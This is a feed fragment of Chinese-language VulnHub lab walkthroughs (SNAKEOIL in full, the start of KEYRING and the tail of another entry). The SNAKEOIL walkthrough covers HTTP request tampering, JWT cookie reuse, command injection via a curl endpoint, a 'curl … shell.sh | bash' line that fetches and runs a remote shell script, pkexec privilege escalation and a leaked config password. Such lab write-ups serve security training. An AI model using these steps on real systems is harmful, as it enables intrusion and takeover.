&lt;p&gt;su shrek 依靠 onion 密码登陆 ssh 成功&lt;br&gt;
这里使用 python 进行提权，得到 root 身份运行的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-579.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/</id>
        <title>VULNHUB 25 SNAKEOIL</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGlnaXRhbHdvcmxkbG9jYWwtc25ha2VvaWwsNzM4Lw==&#34;&gt;https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2ODg5NjQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15688964.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-580.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.143&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.143&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-581.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8080&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAy&#34;&gt;http://192.168.31.102&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-582.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-583.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 80 端口没有任何发现&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv&#34;&gt;http://192.168.31.143:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-584.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143:8080/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-585.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 8080 端口存在以下目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvc2VjcmV0&#34;&gt;http://192.168.31.143:8080/secret&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdGVzdA==&#34;&gt;http://192.168.31.143:8080/test&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;burp-篡改数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-篡改数据包&#34;&gt;#&lt;/a&gt; BURP 篡改数据包&lt;/h3&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-586.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-587.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-588.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-589.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提示内容不理解，换其他目录查看&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-590.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-591.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-592.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-593.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 没啥效果，去访问其他页面看看 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-594.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 猜测确实需要 username 和 password 两个字段&lt;/p&gt;
&lt;h3 id=&#34;content-type-字段利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#content-type-字段利用&#34;&gt;#&lt;/a&gt; Content-Type 字段利用&lt;/h3&gt;
&lt;p&gt;仔细观察数据包，发现缺少 Content-type 字段：&lt;br&gt;
application/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是标准的编码格式。&lt;br&gt;
multipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分。&lt;br&gt;
text/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字符。&lt;/p&gt;
&lt;p&gt;访问目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
 添加字段：Content-Type:application/x-www-form-urlencoded&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-595.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示变了，password 字段不能为空，再加上 password 字段：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-596.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注册成功，那就在 /login 页面登陆一下，要加上用户名和密码：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-597.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再访问一些别的页面（现在是在登陆状态中）：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-598.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 没啥新发现&lt;/p&gt;
&lt;h3 id=&#34;扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩大信息面&#34;&gt;#&lt;/a&gt; 扩大信息面&lt;/h3&gt;
&lt;p&gt;用更大的字典又扫了一遍目录，发现两个新目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvY3JlYXRl&#34;&gt;http://192.168.31.143:8080/create&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-599.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-600.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示需要修改请求方法，抓取数据包&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-601.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改提交方法为 POST&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-602.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示要以 url:port 形式提供要请求的 URL：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-603.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;格式换成 Content-Type: application/json， 在 ajax 中，如果没加 contentType:“application/json”，那么 data 就对应的是 json 对象；反之，如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-604.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 现在又提示需要 secret key ，&lt;/p&gt;
&lt;h3 id=&#34;伪造-access_token&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪造-access_token&#34;&gt;#&lt;/a&gt; 伪造 access_token&lt;/h3&gt;
&lt;p&gt;访问一下 /secret 页面：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-605.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登录是失败的，应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：&lt;br&gt;
 &lt;code&gt;“access_token”:“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlOWJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2NTI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3H7CSshM5oXZYl2XpSDo”&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是填写 cookie 时是需要一个 key 值的，这个 key 值在尝试 access_token 时是不对的&lt;br&gt;
翻阅网站，找到以下地址中网站中有个链接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-606.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点进去看看，有一些配置信息链接，从中找到了 cookie 的名称&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-607.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次提交 cookie，字段名字为 access_token_cookie：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-608.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到 “secret_key”: “commandexecutionissecret”&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重新梳理一下思路：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;1 .访问registration,login页面，因为Get方式报错，所以改为了Post方式提示&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;字段缺失，因此增加了该字段，但是无效果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;2 .访问&lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt;页面，发现确实需要&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password两个字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;3 .重新审查registration数据包，发现缺少Content-Type字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;4 .在registration添加字段：Content-Type:application/x-www-form-urlencoded 后成功提交了&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;数据提示缺少password字段，添加后返回注册成功的消息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;5 .在login中添加Content-Type与&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password后登陆成功，返回了access_token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;6 .访问run页面，发现需要提交url：port数据，修改Content-Type为json数据后，把url和port提交，提示需要secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;7.访问secret页面，发现返回错误，推测与login登陆后返回的token有关，但cookies的字段名是不知道的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;8 .点击网站，搜寻到cookies的字段名为access_token_cookie，将cookies的字段名修改后重新提交到secret页面，返回了secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;9 .接下来需要访问run界面，并且把上述得到的secret_key加上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;curl-rce-命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-rce-命令执行&#34;&gt;#&lt;/a&gt; CURL RCE 命令执行&lt;/h3&gt;
&lt;p&gt;访问 run 界面，加上 secret_key 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-609.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;返回了比较奇怪的字符串，直接搜索，发现这是 curl 命令执行后的回显&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-610.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;相当于在 curl 后拼接命令，但是管道符号不起作用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-611.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-612.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试往其中写入 shell: &lt;code&gt;curl http://www.chentuo.asia/shell.sh | bash;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-613.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试:`curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=&#34;&gt;http://www.chentuo.asia/shell.sh&lt;/span&gt; | sh;``&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-614.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 登陆成功，拿到了 patrick 的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-615.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
&lt;p&gt;服务器存在 s 权限的 pkexec，并且有 gcc 编译器&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-616.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 通过 pkexec 进行提权，成功拿到了 root 权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-617.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;配置文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置文件泄露&#34;&gt;#&lt;/a&gt; 配置文件泄露&lt;/h3&gt;
&lt;p&gt;看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权&lt;br&gt;
调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-618.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到一个密码：NOreasonableDOUBTthisPASSWORDisGOOD&lt;br&gt;
sudo su 使用此密码通过 patrick 来提到 root&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-619.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/123%20KEYRING/</id>
        <title>VULNHUB 23 KEYRING</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/123%20KEYRING/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEta2V5cmluZy0xMDEsNzE4Lw==&#34;&gt;https://www.vulnhub.com/entry/ia-keyring-101,718/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyMzcz&#34;&gt;https://blog.csdn.net/hljzzj/article/details/122952373&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 KEYRING：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-524.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.127&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.208&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-525.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4&#34;&gt;http://192.168.31.208&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-526.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是一个注册登陆的界面，直接输入 12345:12345 注册一个账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-527.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将注册的账户通过 login 界面登陆进去&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-528.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登陆后的页面中 Home 是欢迎 12345 用户的信息，下面显示了时间&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-529.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 control 页面，显示的是一个 HPP 参数污染的提示&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-530.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目前得到的信息并不能进行攻击，需要寻找更多的信息&lt;br&gt;
对目标网址进行路径扫描，寻找更多的信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.208&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-531.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;dirsearch 并没有加载出来有利用价值的信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.208&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-532.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; gobuster 扫描出来了一个 history.php 的路径&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhw&#34;&gt;http://192.168.31.208/history.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-533.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wfuzz-爆破参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-爆破参数&#34;&gt;#&lt;/a&gt; wfuzz 爆破参数&lt;/h3&gt;
&lt;p&gt;提示说没有找到活跃的用户，猜测这里是因为没有登陆用户的原因&lt;br&gt;
找到登陆页面，登陆我们之前注册的用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-534.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;重新打开 history.php 页面，提示信息变成了空白的，说明用户登陆对此页面的回显结果是有影响的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-535.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很明显这个 history.php 的文件是存在问题的，怀疑后面是否有参数地址&lt;br&gt;
可以用 wfuzz 进行爆破参数地址试试&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.31.208/history.php?FUZZ=xxx&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-536.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现全是 200 ，那就不能用 wfuzz 测试参数了，需要用其他的方式&lt;/p&gt;
&lt;h3 id=&#34;模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模糊测试&#34;&gt;#&lt;/a&gt; 模糊测试&lt;/h3&gt;
&lt;p&gt;之前收集到的信息中有一句话 “can’t find this user’s activity”，尝试 user 参数&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=&#34;&gt; http://192.168.31.208/history.php?user=admin&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-537.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆出来了源码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n&#34;&gt;http://github.com/cyberbot75/keyring&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-538.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;手工sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工sql注入&#34;&gt;#&lt;/a&gt; 手工 sql 注入&lt;/h3&gt;
